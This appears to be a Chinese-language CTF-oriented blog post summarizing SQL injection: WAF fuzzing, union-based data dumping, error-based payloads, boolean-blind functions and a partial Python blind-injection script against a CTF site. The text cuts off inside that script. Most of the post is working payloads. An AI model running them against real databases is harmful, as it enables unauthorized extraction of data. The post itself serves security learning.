<!DOCTYPE html>

<html lang="en">

<head>
    
    <title>sql注入总结 - Hexo</title>
    <meta charset="UTF-8">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
    <meta name="description" content="思路0x01 参数包裹测试 1 &#39; &quot; ( {  0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id&#x3D;1$&#39;$  测试关键字waf，and，select等 id&#x3D;1$and$  依据有差别的注入点，测试替换 id&#x3D;-1&#39; or &#39;&#39;&#x3D;&#39;$and$">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入总结">
<meta property="og:url" content="https://0xr1ngs.github.io/2018/05/26/sql/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="思路0x01 参数包裹测试 1 &#39; &quot; ( {  0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 id&#x3D;1$&#39;$  测试关键字waf，and，select等 id&#x3D;1$and$  依据有差别的注入点，测试替换 id&#x3D;-1&#39; or &#39;&#39;&#x3D;&#39;$and$">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://0xr1ngs.github.io/2018/05/26/sql/1.bmp">
<meta property="og:image" content="https://0xr1ngs.github.io/2018/05/26/sql/1.png">
<meta property="article:published_time" content="2018-05-26T09:18:33.000Z">
<meta property="article:modified_time" content="2023-07-21T14:42:37.644Z">
<meta property="article:author" content="r1ngs">
<meta property="article:tag" content="sqli">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0xr1ngs.github.io/2018/05/26/sql/1.bmp">
    
<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1689950583571">
    
    <link rel="stylesheet" href="/css/style.css?v=1689950583571">

    
        
            <link rel="stylesheet" href="/custom.css?v=1689950583571">
        
    

    
<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>


    <script async src="/js/app.js?v=1689950583571"></script>
    
     

    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag("js", new Date());

  gtag("config", "G-4D4ZJ9G024");
</script>

<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-one-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body class="mdui-drawer-body-left">
    <div id="nexmoe-background">
        <div class="nexmoe-bg" 
            style="background-image: url(https://api.biuioi.com/random-picture/index.php)"
        ></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="r1ngs" class="mdui-btn mdui-btn-icon"><img src="/images/avator.jpg" alt="r1ngs"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="r1ngs">
            <img src="/images/avator.jpg" alt="r1ngs" alt="r1ngs">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>Articles</span>10</div>
        <div><span>Tags</span>8</div>
        <div><span>Categories</span>3</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
        
            
            <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
            </form>
         
    </div>
</div>




        
            
            <div class="nexmoe-widget-wrap">
	<div class="nexmoe-widget nexmoe-social">
		<a
			class="mdui-ripple"
			href="https://github.com/0xr1ngs/"
			target="_blank"
			mdui-tooltip="{content: 'GitHub'}"
			style="
				color: rgb(25, 23, 23);
				background-color: rgba(25, 23, 23, .1);
			"
		>
			<i
				class="nexmoefont icon-github"
			></i> </a
		>
	</div>
</div>

        
            
            
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Categories</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/CTF/">CTF</a>
          <span class="category-list-count">1</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Web/">Web</a>
          <span class="category-list-count">7</span>
        </li>

        
      </ul>

    </div>
  </div>


        
            
            
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sqli/" style="font-size: 20px;">sqli</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(8);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

        
            
            
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Archive</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
    </div>
  </div>



        
            
            
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Recent Posts</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/2023/06/19/Java-Jndi/">Jndi注入</a>
          </li>
        
          <li>
            <a href="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">一次内网渗透测试</a>
          </li>
        
          <li>
            <a href="/2019/05/31/java-random/">Java Random方法的安全问题</a>
          </li>
        
          <li>
            <a href="/2019/03/28/cbc-bit-flip/">对字节反转攻击的深入研究</a>
          </li>
        
          <li>
            <a href="/2018/08/21/xss/">xss总结</a>
          </li>
        
      </ul>
    </div>
  </div>

        
    </aside>
    <div class="nexmoe-copyright">
        &copy; 2023 r1ngs
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
    <div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover"> 
            <img src="https://api.biuioi.com/random-picture/index.php" alt="sql注入总结" loading="lazy">
            <h1>sql注入总结</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2018年05月26日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/Web/">Web</a>
        
        
    </div>
    
    
    
    
    
</div>

    <h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="0x01-参数包裹"><a href="#0x01-参数包裹" class="headerlink" title="0x01 参数包裹"></a>0x01 参数包裹</h2><p>测试</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span> ' " <span class="token punctuation">(</span> {
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="0x02-测试WAF"><a href="#0x02-测试WAF" class="headerlink" title="0x02 测试WAF"></a>0x02 测试WAF</h2><p>测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空<br>用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等</p>
<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>$'$
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>测试关键字waf，and，select等</p>
<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>$<span class="token operator">and</span>$
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>依据有差别的注入点，测试替换</p>
<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' or '</span><span class="token string">'='</span>$<span class="token operator">and</span>$ <span class="token comment" spellcheck="true">/*测试有没有被替换为空等*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="0x03-测试payload"><a href="#0x03-测试payload" class="headerlink" title="0x03 测试payload"></a>0x03 测试payload</h2><p>根据被waf的关键字和测试出的能被绕过的关键字去构造payload，确定注入的类型，再用脚本</p>
<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="0x01-联合查询（有数据回显的时候）"><a href="#0x01-联合查询（有数据回显的时候）" class="headerlink" title="0x01 联合查询（有数据回显的时候）"></a>0x01 联合查询（有数据回显的时候）</h2><p>获取字段数</p>
<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span>
id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>payload:</p>
<pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token comment" spellcheck="true">--+</span>
id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">--+</span>
id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>flag' <span class="token comment" spellcheck="true">--+</span>
id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">.</span>flag <span class="token comment" spellcheck="true">--+</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="0x02-报错注入（union被waf或者没有数据回显）"><a href="#0x02-报错注入（union被waf或者没有数据回显）" class="headerlink" title="0x02 报错注入（union被waf或者没有数据回显）"></a>0x02 报错注入（union被waf或者没有数据回显）</h2><p>fuzz报错函数有没有被waf:<br>floor() extractvalue() updatexml() geometrycollection() multipoint()<br>polygon() multipolygon() linestring() multilinestring() exp()<br>payload:</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">geometrycollection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipoint</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multipolygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">linestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">multilinestring</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token number">b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="0X03-bool盲注（正确和错误两种结果）"><a href="#0X03-bool盲注（正确和错误两种结果）" class="headerlink" title="0X03 bool盲注（正确和错误两种结果）"></a>0X03 bool盲注（正确和错误两种结果）</h2><p>字符串截取函数:</p>
<pre class="line-numbers language-sql"><code class="language-sql">substr<span class="token punctuation">(</span>substring<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">left</span><span class="token punctuation">,</span><span class="token keyword">right</span><span class="token punctuation">,</span>mid
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> test <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'ad'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*不能截取单个字符*/</span>
<span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> test <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*绕过逗号过滤*/</span>
<span class="token keyword">select</span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> test <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>上脚本，两种思路<br>1）</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token operator">regexp</span>、<span class="token operator">rlike</span> <span class="token comment" spellcheck="true">/*正则 ^和$表示匹配字符串的开头和结尾*/</span>
<span class="token operator">like</span> <span class="token comment" spellcheck="true">/*不用%和等号一个效果*/</span>
<span class="token operator">=</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>缺陷</p>
<ul>
<li>.可以匹配任意字符 当字典迭代到.的时候匹配一定成功</li>
<li>单字符被waf并且匹配的字符串里面有这个单字符的时候比较尴尬</li>
<li>默认不区分大小写字母，需用binary辨别为大写还是小写</li>
</ul>
<p>2）<br>二分法 结合ascii或者ord或者hex或者char</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">74</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*从十进制的32到127的16进制*/</span>
<span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> ord<span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> substring<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> char<span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>一个丑陋的盲注脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">payload</span><span class="token punctuation">(</span>rawstr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    newstr <span class="token operator">=</span> rawstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x09</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'Or'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 必须用chr 把16进制转化成字符'\t'</span>
    <span class="token keyword">return</span> newstr


url <span class="token operator">=</span> <span class="token string">'http://ctf5.shiyanbar.com/web/earnest/index.php'</span>
ses <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
true_state <span class="token operator">=</span> <span class="token string">'You are in'</span>

<span class="token comment" spellcheck="true"># database</span>

i <span class="token operator">=</span> <span class="token number">1</span>
raw <span class="token operator">=</span> <span class="token string">"0' or length(database())=%d or '0"</span>
<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    rawpay <span class="token operator">=</span> raw <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">(</span>rawpay<span class="token punctuation">)</span><span class="token punctuation">}</span>
    txt <span class="token operator">=</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> true_state <span class="token keyword">in</span> txt<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'length error!'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"database.length:: %d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>

length <span class="token operator">=</span> i
str <span class="token operator">=</span> <span class="token string">''</span>
raw <span class="token operator">=</span> <span class="token string">"0' or (select ascii(mid( (select database() limit 1 offset 0) from %d)) > %d) or '0"</span>  <span class="token comment" spellcheck="true"># 可以不用for</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    min <span class="token operator">=</span> <span class="token number">31</span>
    max <span class="token operator">=</span> <span class="token number">126</span>
    <span class="token triple-quoted-string string">'''
    min和max各自代表ascii可打印字符的上限和下限
    '''</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        rawpay <span class="token operator">=</span> raw <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span>min <span class="token operator">+</span> max<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">(</span>rawpay<span class="token punctuation">)</span><span class="token punctuation">}</span>
